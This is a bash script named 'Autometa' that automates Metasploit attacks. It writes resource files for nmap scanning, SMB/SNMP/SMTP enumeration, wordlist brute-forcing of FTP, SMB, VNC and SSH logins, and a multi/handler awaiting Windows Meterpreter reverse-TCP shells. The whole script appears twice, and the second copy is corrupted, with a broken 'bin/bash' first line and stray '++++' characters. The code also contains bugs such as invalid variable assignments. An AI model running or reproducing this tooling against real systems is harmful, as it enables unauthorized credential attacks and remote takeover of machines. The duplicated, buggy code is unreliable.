#!/bin/bash
start(){
clear
#echo "Updating The system"
#apt-get update &>/dev/null
clear
apt-get install toilet figlet 
clear
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Autometa"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo Tool used for Automating Metasploit commands
echo Version = beta
echo By Ramikan
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
read -p " 1.	Enter The Project Name:" company
mkdir $company
echo workspace -a $company >> $company/nmap.rc
read -p " 2.	Enter the IP file location:" host
read -p " 3.	Enter The Path of The Username File:" user
if [ "$user" == 0 ]; then
$user = /usr/share/metasploit-framework/data/john/wordlists/common_roots.txt
fi
read -p " 4.	Enter The Path of The Password File:" pass
if [ "$pass" == 0 ]; then
$pass = /usr/share/metasploit-framework/data/john/wordlists/password.lst
fi
#read -p " Enter the Username list:" user
#read -p " Enter the Password list:" pass
read -p "5.		Enter your IP address:" ip
read -p "6.		Enter MSF-Handler port no:" port
#Starting postgresql
service postgresql start
set threads 10
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Basic Configuration Setup Done"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
main
}

main(){
clear
#Home Page
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Menu"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo
echo "1.  Info Gathering & Scanning"
echo "2.  Enumeration"
echo "3.  Hanging Fruit Attacks"
echo "4.  Web Attack"
echo "5.  Voip Attack"
echo "6.  Exploit Create"
echo "7.  MSFconsole"
echo "8.  Open Multihandler"
echo "9.  Exit"
echo
echo -n "Choice: "
read choice

case $choice in
     1) home;;
     2) home1;;
     3) home2;;
     4) home3;;
     5) home4;;
     6) home5;;
	 7) console;;
     8) handler;;
	 9) close;;
esac
}
#==================================================================================================================
#Information Gathering & Scanning
#==================================================================================================================
home(){
clear
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Information Gathering"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "1.  Nmap Scan(TCP&UDP)"
echo "2.  SMB Scan"
echo "3.  Main Menu"
echo -n "Choice: "
read choice

case $choice in
     1) nscan;;
	 2) smb_scan;;
	 3) main;;
esac
}

# Running NMAP SCAN
nscan(){
#Creating NMAP Checks
echo db_nmap -F -sV -sT -O -A --exclude $ip -iL $host >>$company/nmap.rc
echo db_nmap -F -sU --exclude $ip -iL $host >>$company/nmap.rc
echo exit >>$company/nmap.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created nmap resource file under $company/nmap.rc"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo " Running Nmap Scanning For (TCP & UDP)"
#gnome-terminal -e msfconsole -q -r $company/nmap.rc
msfconsole -q -r $company/nmap.rc
home
}

#Running SMB service Scan
smb_scan(){
#Creating SMB version Checks
echo workspace $company >>$company/smb-version-scan.rc
echo use auxiliary/scanner/smb/smb_version>>$company/smb-version-scan.rc
echo services -u -p 445 -R >>$company/smb_login.rc
echo set threads 10 >>$company/smb_login.rc
echo run >>$company/smb_login.rc
echo exit >>$company/smb_login.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created SMB-version resource file under $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Running SMB Version Scan Checks"
msfconsole -q -r $company/smb_login.rc
home
}

#==================================================================================================================
# Enumeration
#==================================================================================================================
home1(){
clear
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Enumeration"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo
echo "1.  SMB"
echo "2.  SNMP"
echo "3.  SMTP"
echo "4.  Main Menu"

echo
echo -n "Choice: "
read choice

case $choice in
     1) smb_enum;;
     2) snmp_enum;;
	 3) smtp_enum;;
	 4) main;;
esac
}

#Running SMB enum
smb_enum(){
read -p " Enter SMB Domain:" smbdomain
if [ "$smbdomain" == 0 ]; then
$smbdomain = workgroup
fi
read -p " Enter SMB Username:" smbuser
if [ "$smbuser" == 0 ]; then
$smbuser = administrator
fi
read -p " Enter SMB Password:" smbpass
if [ "$smbuser" == 0 ]; then
$smbpass = 'Pa$$word1'
fi

#Creating SMB Share enum
echo workspace $company >>$company/smb-share-enum.rc
echo use auxiliary/scanner/smb/smb_enumshares>>$company/smb-share-enum.rc
echo services -u -p 445 -R >>$company/smb-share-enum.rc
echo set SMBDomain $smbdomain >>$company/smb-share-enum.rc
echo set SMBUser $smbuser >>$company/smb-share-enum.rc
echo set SMBPass $smbpass >>$company/smb-share-enum.rc
echo set threads 10 >>$company/smb-share-enum.rc
echo run >>$company/smb-share-enum.rc
echo exit >>$company/smb-share-enum.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created SMB-share resource file under Folder $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"


#Creating SMB User enum
echo workspace $company >>$company/smb-user-enum.rc
echo use auxiliary/scanner/smb/smb_enumusers>>$company/smb-user-enum.rc
echo services -u -p 445 -R >>$company/smb-user-enum.rc
echo set SMBDomain $smbdomain >>$company/smb-user-enum.rc
echo set SMBUser $smbuser >>$company/smb-user-enum.rc
echo set SMBPass $smbpass >>$company/smb-user-enum.rc
echo set threads 10 >>$company/smb-user-enum.rc
echo run >>$company/smb-user-enum.rc
echo exit >>$company/smb-user-enum.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created SMB-user & share resource file under Folder $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Running SMB Share Enumeration"
msfconsole -q -r $company/smb-share-enum.rc
echo "Running SMB User Enumeration"
msfconsole -q -r $company/smb-user-enum.rc
home1
}

#Running SNMP Enum
snmp_enum(){
echo workspace &company >>$company/snmp-comm-enum.rc
echo use auxiliary/scanner/snmp/snmp_login >>$company/snmp-comm-enum.rc
echo services -u -p 161 -R >>$company/snmp-comm-enum.rc
echo set VERSION all >>$company/snmp-comm-enum.rc
echo set threads 10 >>$company/snmp-comm-enum.rc
echo run >>$company/snmp-comm-enum.rc
echo exit >>$company/snmp-comm-enum.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created SNMP resource file under $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Running SNMP Checks"
msfconsole -q -r $company/snmp-comm-enum.rc
home1
}

#Running SMTP Enum
smtp_enum(){
echo workspace &company >>$company/smtp-user-enum.rc
echo use auxiliary/scanner/smtp/smtp_enum >>$company/smtp-user-enum.rc
echo services -u -p 25 -R >>$company/smtp-user-enum.rc
echo set USER_FILE $user >>$company/smtp-user-enum.rc
echo set UNIXONLY false >>$company/smtp-user-enum.rc
echo set threads 10 >>$company/smtp-user-enum.rc
echo run >>$company/smtp-user-enum.rc
echo exit >>$company/smtp-user-enum.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created SMTP resource file under $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Running SNMP Checks"
msfconsole -q -r $company/smtp-user-enum.rc
home1
}


#==================================================================================================================
# Hanging Fruit Attacks
#==================================================================================================================
home2(){
clear
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Menu"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo
echo "1.  FTP Attack"
echo "2.  SNMP Attack"
echo "3.  SMB Attack"
echo "4.  VNC Attack"
echo "5.  SSH Attack"
echo "6.  MSFconsole"
echo "7.  Open Multihandler"
echo "8.  Main Menu"
echo
echo -n "Choice: "
read choice

case $choice in
     1) ftp_scan;;
     2) snmp_scan;;
     3) smb_scan;;
     4) vnc_scan;;
     5) ssh_scan;;
	 6) console;;
     7) handler;;
	 8) main;;
esac
}

#FTP Attack
ftp_scan(){
#Creating FTP Checks
echo workspace $company >>$company/ftp-anon.rc
echo workspace $company >>$company/ftp-brute.rc
echo use auxiliary/scanner/ftp/anonymous >>$company/ftp-anon.rc
echo use auxiliary/scanner/ftp/ftp_login >>$company/ftp-brute.rc
echo services -u -p 21 -R >>$company/ftp-anon.rc
echo services -u -p 21 -R >>$company/ftp-brute.rc
echo set threads 10 >>$company/ftp-anon.rc
echo set threads 10 >>$company/ftp-brute.rc
echo set USER_FILE $user >>$company/ftp-brute.rc
echo set PASS_FILE $pass >>$company/ftp-brute.rc
echo run >>$company/ftp-brute.rc
echo run >>$company/ftp-anon.rc
echo exit >>$company/ftp-brute.rc
echo exit >>$company/ftp-anon.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created ftp resource file under $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Running FTP Checks"
msfconsole -q -r $company/ftp-brute.rc
msfconsole -q -r $company/ftp-anon.rc
#gnome-terminal -e msfconsole -r $company/ftp-brute.rc
#gnome-terminal -e msfconsole -r $company/ftp-anon.rc
home2
}

#Running SNMP Enum
snmp_scan(){
read -p " Enter Community string name:" community
if [ "$community" == 0 ]; then
$community = public
fi
echo workspace &company >>$company/snmp-user-enum.rc
echo use auxiliary/scanner/snmp/snmp_enumusers >>$company/snmp-user-enum.rc
echo services -u -p 161 -R >>$company/snmp-user-enum.rc
echo set VERSION 2c >>$company/snmp-user-enum.rc
echo set threads 10 >>$company/snmp-user-enum.rc
echo run >>$company/snmp-user-enum.rc
echo exit >>$company/snmp-user-enum.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created SNMP resource file under $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Running SNMP User-Enum"
msfconsole -q -r $company/snmp-user-enum.rc
home2
}

# Running SMB Checks
smb_scan(){
#Creating SMB Checks
echo workspace $company >>$company/smb_login.rc
echo use auxiliary/scanner/smb/smb_login >>$company/smb_login.rc
echo services -u -p 445 -R >>$company/smb_login.rc
echo set threads 10 >>$company/smb_login.rc
echo set USER_FILE $user >>$company/smb_login.rc
echo set PASS_FILE $pass >>$company/smb_login.rc
echo set record_guest yes >>$company/smb_login.rc
echo run >>$company/smb_login.rc
echo exit >>$company/smb_login.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created smb resource file under $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo " Running SMB checks"
#gnome-terminal -e msfconsole -q -r $company/smb_login.rc
msfconsole -q -r $company/smb_login.rc
home2
}

# Running VNC Checks
vnc_scan(){
#Creating VNC Checks
echo workspace $company >>$company/vnc-login.rc
echo use auxiliary/scanner/vnc/vnc_login >>$company/vnc-login.rc
echo services -u -p 5900 -R >>$company/vnc-login.rc
echo set threads 10 >>$company/vnc-login.rc
echo set DB_ALL_CREDS true >>$company/vnc-login.rc
echo set DB_ALL_USERS true >>$company/vnc-login.rc
echo set DB_ALL_PASS true >>$company/vnc-login.rc
echo set USER_FILE $user >>$company/vnc-login.rc
echo run >>$company/vnc-login.rc
echo exit >>$company/vnc-login.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created VNC resource file under $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo " Running VNC checks"
#gnome-terminal -e msfconsole -q -r $company/smb_login.rc
msfconsole -q -r $company/vnc-login.rc
home2
}

# Running SSH Checks
ssh_scan(){
#Creating SSH Checks
echo workspace $company >>$company/ssh.rc
echo use auxiliary/scanner/ssh/ssh_login >>$company/ssh.rc
echo services -u -p 22 -R >>$company/ssh.rc
echo set threads 10 >>$company/ssh.rc
echo set DB_ALL_CREDS true >>$company/ssh.rc
echo set DB_ALL_USERS true >>$company/ssh.rc
echo set DB_ALL_PASS true >>$company/ssh.rc
echo set USER_FILE $user >>$company/ssh.rc
echo run >>$company/ssh.rc
echo exit >>$company/ssh.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created SSH resource file under $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo " Running SSH checks"
#gnome-terminal -e msfconsole -q -r $company/ssh.rc
msfconsole -q -r $company/ssh.rc
home1
}


#home Page
home3(){
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Menu"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
main
}

#home Page
home4(){
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Menu"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
main
}

#home Page
home5(){
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Menu"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
main
}

#home Page
home6(){
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Menu"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
main
}

#home Page
home7(){
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Menu"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
main
}

#home Page
home8(){
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Menu"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
main
}

#msfconsole Current Workspace
console(){
echo workspace $company >>$company/console.rc
echo " Opening your MSF workspace"
echo "To close & Jump To Menu Type 'exit'"
msfconsole -q -r $company/console.rc
main
}
#MSF Multi Handler
handler(){
echo use exploit/multi/handler >>$company/multihandler.rc
echo set PAYLOAD windows/meterpreter/reverse_tcp >>$company/multihandler.rc
echo set LHOST $ip >>$company/multihandler.rc
echo set LPORT $port >>$company/multihandler.rc
echo set ExitOnSession false >>$company/multihandler.rc
echo set AutoRunScript post/windows/manage/smart_migrate >>$company/multihandler.rc
echo exploit -j -z >>$company/multihandler.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo " Running MSF Multi handler at &ip &port checks"
#gnome-terminal -e msfconsole -q -r $company/multihandler.rc
msfconsole -q -r $company/multihandler.rc
main
}
#Closing the Tool
close(){
exit
}
start
bin/bash
start(){
clear
#echo "Updating The system"
#apt-get update &>/dev/null
clear
apt-get install toilet figlet 
clear
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Autometa"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo Tool used for Automating Metasploit commands
echo Version = beta
echo By Ramikan
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
read -p " 1.	Enter The Project Name:" company
mkdir $company
echo workspace -a $company >> $company/nmap.rc
read -p " 2.	Enter the IP file location:" host
read -p " 3.	Enter The Path of The Username File:" user
if [ "$user" == 0 ]; then
$user = /usr/share/metasploit-framework/data/john/wordlists/common_roots.txt
fi
read -p " 4.	Enter The Path of The Password File:" pass
if [ "$pass" == 0 ]; then
$pass = /usr/share/metasploit-framework/data/john/wordlists/password.lst
fi
#read -p " Enter the Username list:" user
#read -p " Enter the Password list:" pass
read -p "5.		Enter your IP address:" ip
read -p "6.		Enter MSF-Handler port no:" port
#Starting postgresql
service postgresql start
set threads 10
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Basic Configuration Setup Done"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
main
}

main(){
clear
#Home Page
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Menu"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo
echo "1.  Info Gathering & Scanning"
echo "2.  Enumeration"
echo "3.  Hanging Fruit Attacks"
echo "4.  Web Attack"
echo "5.  Voip Attack"
echo "6.  Exploit Create"
echo "7.  MSFconsole"
echo "8.  Open Multihandler"
echo "9.  Exit"
echo
echo -n "Choice: "
read choice

case $choice in
     1) home;;
     2) home1;;
     3) home2;;
     4) home3;;
     5) home4;;
     6) home5;;
	 7) console;;
     8) handler;;
	 9) close;;
esac
}
#==================================================================================================================
#Information Gathering & Scanning
#==================================================================================================================
home(){
clear
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Information Gathering"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "1.  Nmap Scan(TCP&UDP)"
echo "2.  SMB Scan"
echo "3.  Main Menu"
echo -n "Choice: "
read choice

case $choice in
     1) nscan;;
	 2) smb_scan;;
	 3) main;;
esac
}

# Running NMAP SCAN
nscan(){
#Creating NMAP Checks
echo db_nmap -F -sV -sT -O -A --exclude $ip -iL $host >>$company/nmap.rc
echo db_nmap -F -sU --exclude $ip -iL $host >>$company/nmap.rc
echo exit >>$company/nmap.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created nmap resource file under $company/nmap.rc"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo " Running Nmap Scanning For (TCP & UDP)"
#gnome-terminal -e msfconsole -q -r $company/nmap.rc
msfconsole -q -r $company/nmap.rc
home
}

#Running SMB service Scan
smb_scan(){
#Creating SMB version Checks
echo workspace $company >>$company/smb-version-scan.rc
echo use auxiliary/scanner/smb/smb_version>>$company/smb-version-scan.rc
echo services -u -p 445 -R >>$company/smb_login.rc
echo set threads 10 >>$company/smb_login.rc
echo run >>$company/smb_login.rc
echo exit >>$company/smb_login.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"++++
echo "Created SMB-version resource file under $company/ftp*"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"++++
echo "Running SMB Version Scan Checks"
msfconsole -q -r $company/smb_login.rc
home
}

#==================================================================================================================
# Enumeration
#==================================================================================================================
home1(){
clear
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Enumeration"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo
echo "1.  SMB"
echo "2.  SNMP"
echo "3.  SMTP"
echo "4.  Main Menu"

echo
echo -n "Choice: "
read choice

case $choice in
     1) smb_enum;;
     2) snmp_enum;;
	 3) smtp_enum;;
	 4) main;;
esac
}

#Running SMB enum
smb_enum(){
read -p " Enter SMB Domain:" smbdomain
if [ "$smbdomain" == 0 ]; then
$smbdomain = workgroup
fi
read -p " Enter SMB Username:" smbuser
if [ "$smbuser" == 0 ]; then
$smbuser = administrator
fi
read -p " Enter SMB Password:" smbpass
if [ "$smbuser" == 0 ]; then
$smbpass = 'Pa$$word1'
fi

#Creating SMB Share enum
echo workspace $company >>$company/smb-share-enum.rc
echo use auxiliary/scanner/smb/smb_enumshares>>$company/smb-share-enum.rc
echo services -u -p 445 -R >>$company/smb-share-enum.rc
echo set SMBDomain $smbdomain >>$company/smb-share-enum.rc
echo set SMBUser $smbuser >>$company/smb-share-enum.rc
echo set SMBPass $smbpass >>$company/smb-share-enum.rc
echo set threads 10 >>$company/smb-share-enum.rc
echo run >>$company/smb-share-enum.rc
echo exit >>$company/smb-share-enum.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"++++
echo "Created SMB-share resource file under Folder $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"++++


#Creating SMB User enum
echo workspace $company >>$company/smb-user-enum.rc
echo use auxiliary/scanner/smb/smb_enumusers>>$company/smb-user-enum.rc
echo services -u -p 445 -R >>$company/smb-user-enum.rc
echo set SMBDomain $smbdomain >>$company/smb-user-enum.rc
echo set SMBUser $smbuser >>$company/smb-user-enum.rc
echo set SMBPass $smbpass >>$company/smb-user-enum.rc
echo set threads 10 >>$company/smb-user-enum.rc
echo run >>$company/smb-user-enum.rc
echo exit >>$company/smb-user-enum.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"++++++++++++
echo "Created SMB-user & share resource file under Folder $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"++++++++++++
echo "Running SMB Share Enumeration"
msfconsole -q -r $company/smb-share-enum.rc
echo "Running SMB User Enumeration"
msfconsole -q -r $company/smb-user-enum.rc
home1
}

#Running SNMP Enum
snmp_enum(){
echo workspace &company >>$company/snmp-comm-enum.rc
echo use auxiliary/scanner/snmp/snmp_login >>$company/snmp-comm-enum.rc
echo services -u -p 161 -R >>$company/snmp-comm-enum.rc
echo set VERSION all >>$company/snmp-comm-enum.rc
echo set threads 10 >>$company/snmp-comm-enum.rc
echo run >>$company/snmp-comm-enum.rc
echo exit >>$company/snmp-comm-enum.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created SNMP resource file under $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Running SNMP Checks"
msfconsole -q -r $company/snmp-comm-enum.rc
home1
}

#Running SMTP Enum
smtp_enum(){
echo workspace &company >>$company/smtp-user-enum.rc
echo use auxiliary/scanner/smtp/smtp_enum >>$company/smtp-user-enum.rc
echo services -u -p 25 -R >>$company/smtp-user-enum.rc
echo set USER_FILE $user >>$company/smtp-user-enum.rc
echo set UNIXONLY false >>$company/smtp-user-enum.rc
echo set threads 10 >>$company/smtp-user-enum.rc
echo run >>$company/smtp-user-enum.rc
echo exit >>$company/smtp-user-enum.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created SMTP resource file under $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Running SNMP Checks"
msfconsole -q -r $company/smtp-user-enum.rc
home1
}


#==================================================================================================================
# Hanging Fruit Attacks
#==================================================================================================================
home2(){
clear
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Menu"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo
echo "1.  FTP Attack"
echo "2.  SNMP Attack"
echo "3.  SMB Attack"
echo "4.  VNC Attack"
echo "5.  SSH Attack"
echo "6.  MSFconsole"
echo "7.  Open Multihandler"
echo "8.  Main Menu"
echo
echo -n "Choice: "
read choice

case $choice in
     1) ftp_scan;;
     2) snmp_scan;;
     3) smb_scan;;
     4) vnc_scan;;
     5) ssh_scan;;
	 6) console;;
     7) handler;;
	 8) main;;
esac
}

#FTP Attack
ftp_scan(){
#Creating FTP Checks
echo workspace $company >>$company/ftp-anon.rc
echo workspace $company >>$company/ftp-brute.rc
echo use auxiliary/scanner/ftp/anonymous >>$company/ftp-anon.rc
echo use auxiliary/scanner/ftp/ftp_login >>$company/ftp-brute.rc
echo services -u -p 21 -R >>$company/ftp-anon.rc
echo services -u -p 21 -R >>$company/ftp-brute.rc
echo set threads 10 >>$company/ftp-anon.rc
echo set threads 10 >>$company/ftp-brute.rc
echo set USER_FILE $user >>$company/ftp-brute.rc
echo set PASS_FILE $pass >>$company/ftp-brute.rc
echo run >>$company/ftp-brute.rc
echo run >>$company/ftp-anon.rc
echo exit >>$company/ftp-brute.rc
echo exit >>$company/ftp-anon.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created ftp resource file under $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Running FTP Checks"
msfconsole -q -r $company/ftp-brute.rc
msfconsole -q -r $company/ftp-anon.rc
#gnome-terminal -e msfconsole -r $company/ftp-brute.rc
#gnome-terminal -e msfconsole -r $company/ftp-anon.rc
home2
}

#Running SNMP Enum
snmp_scan(){
read -p " Enter Community string name:" community
if [ "$community" == 0 ]; then
$community = public
fi
echo workspace &company >>$company/snmp-user-enum.rc
echo use auxiliary/scanner/snmp/snmp_enumusers >>$company/snmp-user-enum.rc
echo services -u -p 161 -R >>$company/snmp-user-enum.rc
echo set VERSION 2c >>$company/snmp-user-enum.rc
echo set threads 10 >>$company/snmp-user-enum.rc
echo run >>$company/snmp-user-enum.rc
echo exit >>$company/snmp-user-enum.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created SNMP resource file under $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Running SNMP User-Enum"
msfconsole -q -r $company/snmp-user-enum.rc
home2
}

# Running SMB Checks
smb_scan(){
#Creating SMB Checks
echo workspace $company >>$company/smb_login.rc
echo use auxiliary/scanner/smb/smb_login >>$company/smb_login.rc
echo services -u -p 445 -R >>$company/smb_login.rc
echo set threads 10 >>$company/smb_login.rc
echo set USER_FILE $user >>$company/smb_login.rc
echo set PASS_FILE $pass >>$company/smb_login.rc
echo set record_guest yes >>$company/smb_login.rc
echo run >>$company/smb_login.rc
echo exit >>$company/smb_login.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created smb resource file under $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo " Running SMB checks"
#gnome-terminal -e msfconsole -q -r $company/smb_login.rc
msfconsole -q -r $company/smb_login.rc
home2
}

# Running VNC Checks
vnc_scan(){
#Creating VNC Checks
echo workspace $company >>$company/vnc-login.rc
echo use auxiliary/scanner/vnc/vnc_login >>$company/vnc-login.rc
echo services -u -p 5900 -R >>$company/vnc-login.rc
echo set threads 10 >>$company/vnc-login.rc
echo set DB_ALL_CREDS true >>$company/vnc-login.rc
echo set DB_ALL_USERS true >>$company/vnc-login.rc
echo set DB_ALL_PASS true >>$company/vnc-login.rc
echo set USER_FILE $user >>$company/vnc-login.rc
echo run >>$company/vnc-login.rc
echo exit >>$company/vnc-login.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created VNC resource file under $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo " Running VNC checks"
#gnome-terminal -e msfconsole -q -r $company/smb_login.rc
msfconsole -q -r $company/vnc-login.rc
home2
}

# Running SSH Checks
ssh_scan(){
#Creating SSH Checks
echo workspace $company >>$company/ssh.rc
echo use auxiliary/scanner/ssh/ssh_login >>$company/ssh.rc
echo services -u -p 22 -R >>$company/ssh.rc
echo set threads 10 >>$company/ssh.rc
echo set DB_ALL_CREDS true >>$company/ssh.rc
echo set DB_ALL_USERS true >>$company/ssh.rc
echo set DB_ALL_PASS true >>$company/ssh.rc
echo set USER_FILE $user >>$company/ssh.rc
echo run >>$company/ssh.rc
echo exit >>$company/ssh.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created SSH resource file under $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo " Running SSH checks"
#gnome-terminal -e msfconsole -q -r $company/ssh.rc
msfconsole -q -r $company/ssh.rc
home1
}


#home Page
home3(){
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Menu"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
main
}

#home Page
home4(){
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Menu"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
main
}

#home Page
home5(){
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Menu"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
main
}

#home Page
home6(){
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Menu"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
main
}

#home Page
home7(){
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Menu"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
main
}

#home Page
home8(){
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Menu"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
main
}

#msfconsole Current Workspace
console(){
echo workspace $company >>$company/console.rc
echo " Opening your MSF workspace"
echo "To close & Jump To Menu Type 'exit'"
msfconsole -q -r $company/console.rc
main
}
#MSF Multi Handler
handler(){
echo use exploit/multi/handler >>$company/multihandler.rc
echo set PAYLOAD windows/meterpreter/reverse_tcp >>$company/multihandler.rc
echo set LHOST $ip >>$company/multihandler.rc
echo set LPORT $port >>$company/multihandler.rc
echo set ExitOnSession false >>$company/multihandler.rc
echo set AutoRunScript post/windows/manage/smart_migrate >>$company/multihandler.rc
echo exploit -j -z >>$company/multihandler.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo " Running MSF Multi handler at &ip &port checks"
#gnome-terminal -e msfconsole -q -r $company/multihandler.rc
msfconsole -q -r $company/multihandler.rc
main
}
#Closing the Tool
close(){
exit
}
start
